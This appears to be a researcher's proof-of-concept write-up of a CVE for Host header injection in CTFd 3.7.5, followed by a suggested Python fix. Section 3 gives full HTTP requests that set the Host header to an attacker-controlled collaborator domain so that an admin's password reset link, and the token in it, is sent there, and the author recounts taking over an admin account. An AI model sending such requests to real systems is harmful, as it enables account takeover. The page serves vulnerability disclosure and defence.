---
last_update: 2025-05-02 10:15:00
---

# POC CVE-2025-23001 CTFd 3.7.5

> Posted by TheWindGhost — 31/01/2025, Updated: 19/04/2025
>
> Report co-authors:
>
> - h??? (PTIT Ho-Chi-Minh City)
> - thD (VLUTE Vinh-Long City)
> - taneora (HUST Ha-Noi City)

The vulnerability was originally discovered by **TheWindGhost** (Security Researcher), who was the first to identify and
confirm the issue. Co-Authors contributed technical write-up, report structuring, and analysis.

---

## 1. Introduction

I first examined the CTFd source code and noticed that it did not secure or filter the Host header. This is where the
vulnerability starts.

![MITRE Reply With CVE-ID](https://thewindghost.github.io/posts/image-post/cve-2025-23001/1.png)

---

![Host Header Injection POC](https://thewindghost.github.io/posts/image-post/cve-2025-23001/2.png)

---

## 2. Host Header Injection

The request looks like this:

```http
- Test Host Header Injection
GET / HTTP/2
Host: 0ghb7us820bm4l90zd2vvixkhbn2bszh.oastify.com
Cookie: delete
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36…
Accept: text/html,application/xhtml+xml,...
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

I changed the Host header to use my Burp Suite collaborator. If the request is received by my server, this is a bug.

---

## 3. Exploit the Vulnerability & Steps to Exploit Reset Password

I logged into my user account and reset my password. The password reset token was included in the URL. Next, I attempted
to exploit this to reset the admin’s password.
![Reset Link Real](https://thewindghost.github.io/posts/image-post/cve-2025-23001/3.png)

I obtained the admin’s email from Discord and sent a request to reset the password:
![Password Reset Form](https://thewindghost.github.io/posts/image-post/cve-2025-23001/4.png)

```http
- Exploit Host Header Injection
POST /reset_password HTTP/2
Host: zx0aot97jzsllkqzgcjuchejya41ssgh.oastify.com
Cookie: delete
Content-Length: 120
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)…
Accept: text/html,application/xhtml+xml,...
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=mail-victim%40gmail.com&_submit=Submit&nonce=fake-937dd2059eb240c25ca77ff5743d4aee
```

And i change domain collaborator in host header request
![Hijacked Password Reset](https://thewindghost.github.io/posts/image-post/cve-2025-23001/5.png)

Then, I waited for the admin to click the reset link and successfully hijacked the password reset process.
![Hijacked Successfully](https://thewindghost.github.io/posts/image-post/cve-2025-23001/6.png)

Okay and we will reset password for login account admin.
![Reset Password Account Admin Screenshot](https://thewindghost.github.io/posts/image-post/cve-2025-23001/7.png)

Finally, I successfully exploited the vulnerability. One hour later, I spoke with the developer, but he didn’t understand that I had hacked and gained access to his account. I explained it to him and asked him to send me a screenshot of the email.

![Admin Account Access](https://thewindghost.github.io/posts/image-post/cve-2025-23001/8.png)
![Email Screenshot](https://thewindghost.github.io/posts/image-post/cve-2025-23001/9.png)

---

## 5. Security Fix

```python
- To secure against this vulnerability, add the following code:
import os
import re
from flask import request, abort
from CTFd import create_app

ALLOWED_HOSTS = {
"example.com", # change domain server
"192.168.1.1", # change ip public
}

ALLOWED_PROXIES = {"127.0.0.1", "192.168.1.1"} # change ip public

BLOCKED_HOST_REGEX = re.compile(r"^(localhost|127\.0\.0\.1|0\.0\.0\.0|::1|local)$", re.IGNORECASE)

app = create_app()

@app.before_request
def strict_host_protection():
host = request.headers.get("Host", "").split(":")[0]
forwarded_host = request.headers.get("X-Forwarded-Host", "").split(":")[0]
remote_addr = request.remote_addr
forwarded_for = request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
real_ip = forwarded_for if forwarded_for else remote_addr

if forwarded_host and forwarded_host not in ALLOWED_HOSTS:
print(f"[SECURITY] block: {forwarded_host} -> {real_ip}")
abort(400)

if remote_addr in ALLOWED_PROXIES:
if BLOCKED_HOST_REGEX.match(host) or host not in ALLOWED_HOSTS:
print(f"[SECURITY] block: {host} -> {real_ip}")
abort(400)
else:
abort(400)

if __name__ == "__main__":
app.run(debug=False, host="127.0.0.1", port=4000)
```

Apply my security code to safeguard against this vulnerability and ensure we are protected!
![Reproduce HHI Again](https://thewindghost.github.io/posts/image-post/cve-2025-23001/10.png)
![Email Dev](https://thewindghost.github.io/posts/image-post/cve-2025-23001/11.png)

---

## 6. Vendor Response

When I reached out to the CTFd vendor, they told me that users need to configure Nginx for security. However, according to cybersecurity best practices, security should be built by design and by default. CTFd does not follow this policy.

**MITRE** accepted my submission based on this reasoning.

I would like to express my gratitude to **MITRE** for its fairness in managing CVE updates.
![Secure by default and design](https://thewindghost.github.io/posts/image-post/cve-2025-23001/12.png)

> **Secure by Design and Secure by Default**
>
> - [Beginner’s Guide on Secure byDesign](https://safestack.io/blog/resources/secure-by-design-and-default-a-beginners-guide)
> - [CISA: Secure by Design](https://www.cisa.gov/securebydesign)
